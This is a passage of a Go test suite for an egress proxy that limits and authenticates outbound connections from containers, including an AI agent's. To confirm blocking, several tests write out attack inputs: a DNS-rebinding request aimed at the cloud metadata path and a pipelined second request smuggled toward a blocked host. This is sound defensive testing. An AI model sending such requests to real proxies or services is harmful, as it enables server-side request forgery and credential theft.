	if _, code := e.tunnel(agentIP, "api.agent.test:443"); code != http.StatusOK {
		t.Fatalf("agent tunnel = %d while others are at their limits", code)
	}
	if code, body := e.get(agentIP, "http://api.agent.test/heartbeat"); code != http.StatusOK {
		t.Fatalf("agent plain HTTP = %d %q", code, body)
	}
	if _, code := e.tunnel(agentIP, "api.agent.test:443"); code != http.StatusOK {
		t.Fatalf("agent second reserved tunnel refused")
	}
	if _, code := e.tunnel(agentIP, "api.agent.test:443"); code != http.StatusTooManyRequests {
		t.Fatalf("agent borrowed from an empty shared pool: %d", code)
	}
	// Closing one of alpha's tunnels returns its borrowed slot.
	alphaConns[2].Close()
	deadline := time.Now().Add(3 * time.Second)
	for {
		if _, code := e.tunnel(agentIP, "api.agent.test:443"); code == http.StatusOK {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("slot not returned after alpha closed a tunnel")
		}
		time.Sleep(20 * time.Millisecond)
	}
}

func TestProxyRequestRateIsPerCaller(t *testing.T) {
	e := startEnvWith(t, func(_ *policy.Config, opts *egress.Options) {
		opts.Limits = limits.Config{RequestRate: 0.001, RequestBurst: 3}
	})
	for i := 0; i < 3; i++ {
		if code := e.connect(alphaIP, "evil.test:443"); code != http.StatusForbidden {
			t.Fatalf("request %d = %d", i, code)
		}
	}
	if code := e.connect(alphaIP, "api.alpha.test:443"); code != http.StatusTooManyRequests {
		t.Fatalf("over the rate = %d, want 429", code)
	}
	if code, _ := e.get(agentIP, "https://api.agent.test/x"); code != http.StatusOK {
		t.Fatalf("agent limited by alpha's rate: %d", code)
	}
	if e.dns.QueriedName("evil.test") {
		t.Error("blocked name resolved")
	}
}

func agentToken(t *testing.T, e *env) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(e.authDir, "sealed-agent", auth.TokenFile))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func basicAuth(user, pass string) string {
	return "Proxy-Authorization: Basic " + base64.StdEncoding.EncodeToString([]byte(user+":"+pass))
}

// TestPrivilegedCallerNeedsItsCredential covers source-IP spoofing on the
// apps bridge: a container that claims sealed-agent's IP (ARP poisoning
// with CAP_NET_RAW) gets nothing without the agent's token.
func TestPrivilegedCallerNeedsItsCredential(t *testing.T) {
	e := startEnvWith(t, func(cfg *policy.Config, _ *egress.Options) {
		cfg.Callers[0].ProxyAuth = true // sealed-agent
	})
	token := agentToken(t, e)

	// The spoofer's connection arrives from 172.30.0.3 with no credential.
	if code := e.connect(agentIP, "api.agent.test:443"); code != http.StatusProxyAuthRequired {
		t.Errorf("no credential = %d, want 407", code)
	}
	if code := e.connect(agentIP, "api.agent.test:443", basicAuth("sealed-agent", strings.Repeat("0", 64))); code != http.StatusProxyAuthRequired {
		t.Errorf("wrong token = %d, want 407", code)
	}
	if code := e.connect(agentIP, "api.agent.test:443", basicAuth("alpha", token)); code != http.StatusProxyAuthRequired {
		t.Errorf("wrong user = %d, want 407", code)
	}
	if code := e.raw(agentIP, http.MethodGet, "http://api.agent.test/x"); code != http.StatusProxyAuthRequired {
		t.Errorf("plain HTTP without credential = %d, want 407", code)
	}
	if e.routes.wasDialed("203.0.113.30") {
		t.Fatal("unauthenticated request reached the agent's destination")
	}
	// The real agent, with its token in the proxy URL.
	proxyURL, _ := url.Parse("http://sealed-agent:" + token + "@" + e.svc.ProxyAddr.String())
	client := &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{
		Proxy:             http.ProxyURL(proxyURL),
		DialContext:       e.id.dialer(agentIP),
		TLSClientConfig:   &tls.Config{RootCAs: e.roots, ServerName: "example.com"},
		DisableKeepAlives: true,
	}}
	for _, u := range []string{"https://api.agent.test/a", "http://api.agent.test/b"} {
		resp, err := client.Get(u)
		if err != nil {
			t.Fatalf("%s: %v", u, err)
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK || strings.Contains(string(body), "LEAKED") {
			t.Errorf("%s: %d %q", u, resp.StatusCode, body)
		}
	}
	// Callers without proxyAuth are unaffected.
	if code, _ := e.get(alphaIP, "https://api.alpha.test/x"); code != http.StatusOK {
		t.Errorf("alpha = %d", code)
	}
	// Stats: the reader IP alone is not enough either.
	if code, _ := e.statsBody(agentIP); code != http.StatusForbidden {
		t.Errorf("stats without bearer = %d, want 403", code)
	}
	code, body := e.statsBody(agentIP, "Authorization", "Bearer "+token)
	if code != http.StatusOK {
		t.Fatalf("stats with bearer = %d", code)
	}
	var s stats.Snapshot
	if err := json.Unmarshal([]byte(body), &s); err != nil {
		t.Fatal(err)
	}
	if s.Callers["sealed-agent"].Blocked[policy.KeyUnauthenticated] != 4 || s.Callers["sealed-agent"].Allowed["api.agent.test:443"] != 1 {
		t.Errorf("agent counts = %v", s.Callers["sealed-agent"])
	}
	if strings.Contains(body, token) {
		t.Error("token in stats")
	}
}

func TestRebindingBlockedOverPlainHTTP(t *testing.T) {
	e := startEnv(t)
	if code := e.raw(alphaIP, http.MethodGet, "http://rebind.alpha.test/computeMetadata/v1/", "Metadata-Flavor: Google"); code != http.StatusForbidden {
		t.Errorf("plain HTTP to a name resolving to metadata = %d, want 403", code)
	}
	if !e.dns.QueriedName("rebind.alpha.test") {
		t.Error("name not resolved, so the IP check never ran")
	}
	if e.routes.wasDialed("169.254.") {
		t.Errorf("proxy dialed metadata: %v", e.routes.dialed)
	}
	_, s := e.stats(agentIP)
	if s.Callers["alpha"].Blocked["rebind.alpha.test:80"] != 1 {
		t.Errorf("blocked = %v", s.Callers["alpha"].Blocked)
	}
}

// TestKeepAliveSecondRequestIsCheckedToo sends two pipelined requests on one
// proxy connection; the second targets a blocked host.
func TestKeepAliveSecondRequestIsCheckedToo(t *testing.T) {
	e := startEnv(t)
	conn, err := e.id.dialer(alphaIP)(context.Background(), "tcp", e.svc.ProxyAddr.String())
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_, err = io.WriteString(conn, "GET http://api.alpha.test/first HTTP/1.1\r\nHost: api.alpha.test\r\n\r\n"+
		"GET http://evil.test/second HTTP/1.1\r\nHost: evil.test\r\n\r\n")
	if err != nil {
		t.Fatal(err)
	}
	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	br := bufio.NewReader(conn)
	first, err := http.ReadResponse(br, &http.Request{Method: http.MethodGet})
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(first.Body)
	first.Body.Close()
	if first.StatusCode != http.StatusOK || string(body) != "http api.alpha.test /first" {
		t.Fatalf("first = %d %q", first.StatusCode, body)
	}
	second, err := http.ReadResponse(br, &http.Request{Method: http.MethodGet})
	if err != nil {
		t.Fatal(err)
	}
	second.Body.Close()
	if second.StatusCode != http.StatusForbidden {
		t.Fatalf("second = %d, want 403", second.StatusCode)
	}
	if e.routes.wasDialed("203.0.113.66") || e.dns.QueriedName("evil.test") {
		t.Error("second request reached the blocked host")
	}
}

func TestLocalNetworksAreDenied(t *testing.T) {
	e := startEnvWith(t, func(_ *policy.Config, opts *egress.Options) {
		// Pretend the egress container sits on 198.51.100.0/24.
		opts.LocalSubnets = func() ([]netip.Prefix, error) {
			return []netip.Prefix{netip.MustParsePrefix("198.51.100.0/24")}, nil
		}
	})
	if code := e.connect(alphaIP, "198.51.100.7:443"); code != http.StatusForbidden {
		t.Errorf("allowlisted IP on a local network = %d, want 403", code)
	}
	if e.routes.wasDialed("198.51.100.") {
		t.Error("proxy dialed a local network")
	}
	if code, _ := e.get(alphaIP, "https://api.alpha.test/x"); code != http.StatusOK {
		t.Errorf("unrelated destination = %d", code)
	}
}

// TestSelfConnectionIsDenied resolves an allowed name to one of this host's
// own interface addresses; smokescreen's self-connection guard must stop it.
func TestSelfConnectionIsDenied(t *testing.T) {
	self := ownInterfaceIPv4(t)
	e := startEnvWith(t, func(cfg *policy.Config, _ *egress.Options) {
		cfg.Callers[1].Allow = append(cfg.Callers[1].Allow, "self.alpha.test:443")
		if policy.Classify(self) == policy.ClassPrivate {
			pfx := netip.PrefixFrom(self, 32)
			for _, s := range cfg.AllowedPrivateCIDRs {
				if netip.MustParsePrefix(s).Overlaps(pfx) {
					t.Skipf("%s overlaps the test's allowedPrivateCidrs", self)
				}
			}
			cfg.AllowedPrivateCIDRs = append(cfg.AllowedPrivateCIDRs, pfx.String())
		}
	})
	e.dns.AddA("self.alpha.test", self.String())
	e.routes.mu.Lock()
	e.routes.table[self.String()+":443"] = e.routes.table["203.0.113.10:443"]
	e.routes.mu.Unlock()
	if code := e.connect(alphaIP, "self.alpha.test:443"); code != http.StatusForbidden {
		t.Errorf("CONNECT to the proxy's own address = %d, want 403", code)
	}
	if e.routes.wasDialed(self.String()) {
		t.Error("proxy dialed itself")
	}
}

func ownInterfaceIPv4(t *testing.T) netip.Addr {
	t.Helper()
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		t.Skip(err)
	}
	for _, a := range addrs {
		ipnet, ok := a.(*net.IPNet)
		if !ok {
			continue
		}
		ip, ok := netip.AddrFromSlice(ipnet.IP)
		if !ok {
			continue
		}
		ip = ip.Unmap()
		if c := policy.Classify(ip); ip.Is4() && (c == policy.ClassPublic || c == policy.ClassPrivate) {
			return ip
		}
	}
	t.Skip("no non-loopback IPv4 interface address on this host")
	return netip.Addr{}
}
